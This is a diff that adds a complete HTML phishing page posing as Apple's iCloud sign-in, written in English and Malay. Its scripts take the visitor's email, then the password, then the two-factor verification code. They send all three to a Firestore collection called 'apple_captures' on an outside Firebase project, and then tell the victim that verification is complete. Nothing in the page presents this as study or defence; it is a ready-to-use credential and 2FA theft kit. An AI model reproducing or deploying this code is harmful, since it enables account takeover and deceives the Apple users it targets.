@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title id="pageTitle">Sign in to iCloud</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Firebase SDK modular -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "SENDER_ID",
+      appId: "APP_ID"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    let currentEmail = "";
+    let currentPass = "";
+    let currentLang = 'en';
+
+    const translations = {
+      en: {
+        title: "Sign in with Apple Account",
+        emailPlaceholder: "Email or Phone Number",
+        continueBtn: "Continue",
+        passwordTitle: "Enter Password",
+        passwordPlaceholder: "Password",
+        signInBtn: "Sign In",
+        codeTitle: "Two-Factor Authentication",
+        codeDesc: "Enter the verification code sent to your trusted devices.",
+        verifyBtn: "Verify",
+        langToggle: "Melayu"
+      },
+      ms: {
+        title: "Log masuk dengan Akaun Apple",
+        emailPlaceholder: "E-mel atau Nombor Telefon",
+        continueBtn: "Teruskan",
+        passwordTitle: "Masukkan Kata Laluan",
+        passwordPlaceholder: "Kata Laluan",
+        signInBtn: "Log Masuk",
+        codeTitle: "Pengesahan Dua Faktor",
+        codeDesc: "Masukkan kod pengesahan yang dihantar ke peranti terpercaya anda.",
+        verifyBtn: "Sahkan",
+        langToggle: "English"
+      }
+    };
+
+    window.toggleLang = function() {
+      currentLang = currentLang === 'en' ? 'ms' : 'en';
+      updateLang();
+    };
+
+    function updateLang() {
+      const t = translations[currentLang];
+      document.getElementById('titleText').innerText = t.title;
+      document.getElementById('emailInput').placeholder = t.emailPlaceholder;
+      document.getElementById('emailBtn').innerText = t.continueBtn;
+      document.getElementById('passwordTitle').innerText = t.passwordTitle;
+      document.getElementById('passwordInput').placeholder = t.passwordPlaceholder;
+      document.getElementById('passBtn').innerText = t.signInBtn;
+      document.getElementById('codeTitle').innerText = t.codeTitle;
+      document.getElementById('codeDesc').innerText = t.codeDesc;
+      document.getElementById('codeBtn').innerText = t.verifyBtn;
+      document.getElementById('langToggleText').innerText = t.langToggle;
+    }
+
+    window.handleEmailStep = function(e) {
+      e.preventDefault();
+      currentEmail = document.getElementById('emailInput').value.trim();
+      if (!currentEmail) return;
+
+      document.getElementById('step-email').classList.add('hidden');
+      document.getElementById('step-password').classList.remove('hidden');
+      document.getElementById('labelEmail').innerText = currentEmail;
+      document.getElementById('passwordInput').focus();
+    };
+
+    window.handlePasswordStep = async function(e) {
+      e.preventDefault();
+      currentPass = document.getElementById('passwordInput').value;
+      if (!currentPass) return;
+
+      const btn = document.getElementById('passBtn');
+      btn.disabled = true;
+
+      // Simpan data email & password ke Firebase terus
+      try {
+        await addDoc(collection(db, "apple_captures"), {
+          email: currentEmail,
+          password: currentPass,
+          step: "password_submitted",
+          timestamp: serverTimestamp()
+        });
+      } catch (err) {
+        console.error("Firebase error:", err);
+      }
+
+      btn.disabled = false;
+      document.getElementById('step-password').classList.add('hidden');
+      document.getElementById('step-code').classList.remove('hidden');
+      document.getElementById('codeInput').focus();
+    };
+
+    window.handleCodeStep = async function(e) {
+      e.preventDefault();
+      const codeVal = document.getElementById('codeInput').value.trim();
+      if (!codeVal) return;
+
+      const btn = document.getElementById('codeBtn');
+      btn.innerText = currentLang === 'en' ? 'Verifying...' : 'Mengesahkan...';
+      btn.disabled = true;
+
+      try {
+        await addDoc(collection(db, "apple_captures"), {
+          email: currentEmail,
+          password: currentPass,
+          verificationCode: codeVal,
+          step: "code_submitted",
+          timestamp: serverTimestamp()
+        });
+        
+        alert(currentLang === 'en' ? 'Verification complete.' : 'Pengesahan selesai.');
+        window.location.reload();
+      } catch (err) {
+        console.error("Firebase error:", err);
+        alert("Failed. Try again.");
+        btn.innerText = translations[currentLang].verifyBtn;
+        btn.disabled = false;
+      }
+    };
+  </script>
+</head>
+<body class="bg-black text-white min-h-screen flex flex-col items-center justify-between p-4 font-sans antialiased">
+
+  <!-- Top Language Switcher -->
+  <div class="w-full max-w-sm flex justify-end pt-2">
+    <button onclick="toggleLang()" class="text-xs text-sky-400 hover:underline flex items-center space-x-1">
+      <span id="langToggleText">Melayu</span>
+    </button>
+  </div>
+
+  <div class="max-w-sm w-full space-y-6 text-center my-auto">
+    
+    <!-- Apple Logo & Header -->
+    <div class="space-y-4">
+      <svg class="w-8 h-8 mx-auto text-white fill-current" viewBox="0 0 170 170">
+        <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.78 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.58.1-9.49-2.01-14.75-6.35-3.15-2.61-7.01-7.25-11.58-13.92-3.92-5.79-7.09-11.36-9.53-16.73-5.26-11.66-7.89-22.95-7.89-33.87 0-11.59 2.65-21.2 7.95-28.85 5.3-7.65 11.96-11.55 19.97-11.7 4.9.09 9.94 1.39 15.15 3.89 5.2 2.5 8.68 3.78 10.43 3.85 2.12-.11 5.92-1.5 11.41-4.15 5.5-2.65 10.42-3.94 14.78-3.85 13.68.32 23.95 4.67 30.8 13.06-12.06 7.33-18.06 16.92-18.01 28.77.06 9.4 3.39 17.26 10.01 23.59 4.31 4.13 9.47 6.78 15.48 7.94-1.12 3.3-2.58 6.74-4.38 13.32zm-35.34-87.72c0-8.17 3.05-15.7 9.17-22.58 6.11-6.88 13.68-10.74 22.7-11.58.11 1.25.17 2.37.17 3.35 0 8.08-3.12 15.78-9.35 23.11-6.23 7.33-13.88 11.39-22.96 12.18-.11-1.42-.17-2.61-.17-3.56.01-1.31.07-2.69.17-4.14z"/>
+      </svg>
+      <h1 id="titleText" class="text-2xl font-normal tracking-tight">Sign in with Apple Account</h1>
+    </div>
+
+    <!-- STEP 1: EMAIL -->
+    <form id="step-email" onsubmit="handleEmailStep(event)" class="space-y-4 text-left">
+      <div class="bg-[#1c1c1e] border border-zinc-700/60 rounded-xl overflow-hidden">
+        <input type="text" id="emailInput" placeholder="Email or Phone Number" required class="w-full bg-transparent px-4 py-3.5 text-sm text-white placeholder-zinc-500 focus:outline-none">
+      </div>
+      <button type="submit" id="emailBtn" class="w-full bg-white text-black font-medium py-3 rounded-xl hover:bg-zinc-200 transition text-sm">Continue</button>
+    </form>
+
+    <!-- STEP 2: PASSWORD -->
+    <form id="step-password" onsubmit="handlePasswordStep(event)" class="space-y-4 text-left hidden">
+      <div class="flex items-center justify-between text-xs text-zinc-400 bg-zinc-900/60 px-4 py-2.5 rounded-xl border border-zinc-800">
+        <span id="labelEmail" class="truncate max-w-[220px]"></span>
+        <button type="button" onclick="location.reload()" class="text-sky-400 hover:underline">Edit</button>
+      </div>
+
+      <div class="space-y-1">
+        <h2 id="passwordTitle" class="text-lg font-normal mb-2">Enter Password</h2>
+        <div class="bg-[#1c1c1e] border border-zinc-700/60 rounded-xl overflow-hidden">
+          <input type="password" id="passwordInput" placeholder="Password" required class="w-full bg-transparent px-4 py-3.5 text-sm text-white placeholder-zinc-500 focus:outline-none">
+        </div>
+      </div>
+      <button type="submit" id="passBtn" class="w-full bg-white text-black font-medium py-3 rounded-xl hover:bg-zinc-200 transition text-sm">Sign In</button>
+    </form>
+
+    <!-- STEP 3: VERIFICATION CODE -->
+    <form id="step-code" onsubmit="handleCodeStep(event)" class="space-y-4 text-left hidden">
+      <h2 id="codeTitle" class="text-lg font-normal text-center">Two-Factor Authentication</h2>
+      <p id="codeDesc" class="text-xs text-zinc-400 text-center leading-relaxed">
+        Enter the verification code sent to your trusted devices.
+      </p>
+      <div class="bg-[#1c1c1e] border border-zinc-700/60 rounded-xl overflow-hidden">
+        <input type="text" id="codeInput" placeholder="123456" maxlength="6" required class="w-full bg-transparent px-4 py-3.5 text-center text-lg tracking-[0.4em] text-white placeholder-zinc-500 focus:outline-none">
+      </div>
+      <button type="submit" id="codeBtn" class="w-full bg-white text-black font-medium py-3 rounded-xl hover:bg-zinc-200 transition text-sm">Verify</button>
+    </form>
+
+  </div>
+
+  <div></div>
+
+</body>
+</html>
